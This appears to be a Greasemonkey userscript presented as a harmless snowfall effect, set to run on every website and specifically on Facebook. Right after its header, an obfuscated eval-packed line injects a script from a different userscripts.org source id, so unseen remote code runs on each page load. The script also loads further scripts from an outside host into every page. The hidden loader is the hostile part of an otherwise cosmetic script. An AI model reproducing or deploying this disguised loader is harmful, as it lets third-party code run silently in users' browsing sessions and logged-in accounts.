// ==UserScript==
// @name           Winter Snow Storm Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/users/114488
// @description    Make a mini snow storm on each page
// @include        http://*
// @include        https://*
// @require        http://userscripts.org/scripts/source/64284.user.js
// @require        http://usocheckup.dune.net/64144.js
// @version        3.0
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

var firstTime = GM_getValue('firstTime',0)
var autoSnow = GM_getValue('autoSnow',false)
var snowColor = GM_getValue('snowColor','#fff')
var snowHeight = GM_getValue('snowHeight','8')
var snowWidth = GM_getValue('snowWidth','8')
var snowZ = GM_getValue('snowZ','23')
var maxActive = GM_getValue('maxActive','96')
var maxSnow = GM_getValue('maxSnow','40')
var followMouse = GM_getValue('followMouse',true)
var colorSelected
var isSnowing = false
var isSettings = false
var one
var html

var params = 'snowStorm.flakesMax ='+maxSnow+';'           
+'snowStorm.flakesMaxActive ='+maxActive+';'                    
+'snowStorm.followMouse ='+followMouse+';'        
+'snowStorm.snowColor = \''+snowColor+'\';'         
+'snowStorm.flakeWidth ='+snowWidth+';'           
+'snowStorm.flakeHeight ='+snowHeight+';'                        

setTimeout(function(){customizeSnow(params);},550)
  
addGlobalUrl('http://jamesyang.110mb.com/style.css');
init('http://jamesyang.110mb.com/snow1.js','thiselement');
Get('http://jamesyang.110mb.com/ControlPanel.html');

//============================================================================Key Combos=========================================================================
if (firstTime < 2)
{
	darkAlert("Press Alt-J to make it start snowing refresh the page to make it stop. Press Alt-W for settings. This message should dissapear in 4 seconds. This will only be displayed twice.",'hi5',4000);
	GM_setValue('firstTime',firstTime+1);
}
if(autoSnow == true)
{
	setTimeout(function(){unsafeWindow.snowStorm.start();},2000)
	isSnowing = true;
}

var isAlt = false
var isShift = false

unsafeWindow.document.onkeyup = function(a){
	if (a.keyCode == 18)
	{
		isAlt=false
	}
}

unsafeWindow.document.onkeydown = function(a){
	if (a.keyCode == 18)
		{
			isAlt=true;
		}

	
	if (a.keyCode == 74 && isAlt==true)
	{
		if (isSnowing == false)
		{
			isSnowing = true
			unsafeWindow.snowStorm.start();
		}
		else
		{
  			isSnowing = false
			unsafeWindow.snowStorm.stop();
		}
  	}
	
	else if(a.keyCode == 87 && isAlt==true)
	{
		showSettings()
	}
}

//=======================================================Settings Menu Functions==============================================================
function showSettings()
{
	if(isSettings == false)
	{
		init('http://jamesyang.110mb.com/colorpicker.js','colorpicker');
		postDiv('hello','darkenBackground','hi','none');
		shows('hi');
		isSettings = true
		postDiv(html,'dialog','hi1');
		$('exitbutton').addEventListener("click", function() {exitHandler();}, false);
		$('savebutton').addEventListener("click", function() {saveHandler();},false);
		$('setDefault').addEventListener("click", function() {restoreDefaults();},false);
		displaySettings();
	}
	else
	{
		shows('hi')
		shows('hi1')
		displaySettings();
	}
}

function displaySettings()
{

	$('widthMod').value = snowWidth
	$('heightMod').value = snowHeight
	$('particlesMod').value = maxSnow
	$('activeMod').value = maxActive
	$('zMod').value = snowZ
	$('autoTrue').checked = autoSnow
	$('autoFalse').checked =! autoSnow
	$('followmouse').checked = followMouse
	$('randomize').checked =! followMouse
	$('currentcolor').style.background = snowColor
}

function validateSettings()
{
	GM_setValue('autoSnow',autoSnow)
	GM_setValue('snowColor',snowColor)
	GM_setValue('snowHeight',snowHeight)
	GM_setValue('snowWidth',snowWidth)
	GM_setValue('snowZ',snowZ)
	GM_setValue('maxActive',maxActive)
	GM_setValue('maxSnow',maxSnow)
	GM_setValue('followMouse',followMouse)
}

function saveSettings()
{
	 snowWidth = $('widthMod').value
	 snowHeight = $('heightMod').value
	 maxSnow = $('particlesMod').value
	 maxActive = $('activeMod').value
	 snowZ = $('zMod').value
	 autoSnow = $('autoTrue').checked
	 followMouse = $('followmouse').checked
	 colorSelected = $('colorSelected').checked
	 if(colorSelected == true)
	 {
	 	snowColor = '#'+$('mHEX').innerHTML
	 }
}

function exitHandler()
{ 
	hides('hi');
	hides('hi1');
}

function saveHandler()
{
	saveSettings();
	validateSettings();
}

function restoreDefaults()
{
	autoSnow = false
	snowColor = '#fff'
	snowHeight = '8'
	snowWidth = '8'
	snowZ = '23'
	maxActive = '40'
	maxSnow = '96'
	followMouse = true
	validateSettings();
	displaySettings();
}

//========================================================== Simple Functions============================================================
function init(url,_id)
{
	var head,element1;
	head = document.getElementsByTagName('head')[0];
	element1 = document.createElement('script');
	element1.type = "text/javascript";
	element1.id = _id
	element1.src = url
	head.appendChild(element1);
}

function customizeSnow(_params)
{
	var head,element1;
	head = document.getElementsByTagName('head')[0];
	element1 = document.createElement('script');
	element1.type = "text/javascript";
	element1.id = 'custSnow'
	element1.innerHTML = _params
	head.appendChild(element1);
}

function Get(url)
{
		GM_xmlhttpRequest({
			method: 'GET',
			url: url,
			onload: function(result) {
					one= result.responseText.split('<body>')[1]
					html = one.split('</body>')[0]
			}
		});
}

function postDiv(_innerHTML,_class,_id,_visible,zindex)
{
	var body, element;
	body = document.getElementsByTagName('body')[0];
	element = document.createElement('div');
	element.className = _class
	element.id= _id
	element.style.display = _visible
	element.innerHTML = _innerHTML
	element.style.zIndex = zindex
	body.appendChild(element);
}

function darkAlert(text,id,timeout)
{
	postDiv(text,'darkAlert',id,'visible','50')
	setTimeout(function(){hides(id)},timeout)
}

function shows(id)
{
	$(id).style.display = ''	
}

function hides(id)
{
	$(id).style.display = 'none'	
}

function $(id)
{
	return document.getElementById(id);
}

function addGlobalStyle(css)
{
	var head, style;
	head = document.getElementsByTagName('head')[0];
	if (!head) { return; }
	style = document.createElement('style');
	style.type = 'text/css';
	style.innerHTML = css;
	head.appendChild(style);
}

function addGlobalUrl(css)
{
	var head, style;
	head = document.getElementsByTagName('head')[0];
	if (!head) { return; }
	style = document.createElement('link');
	style.type = 'text/css';
	style.rel="stylesheet";
	style.href = css;
	head.appendChild(style);
}
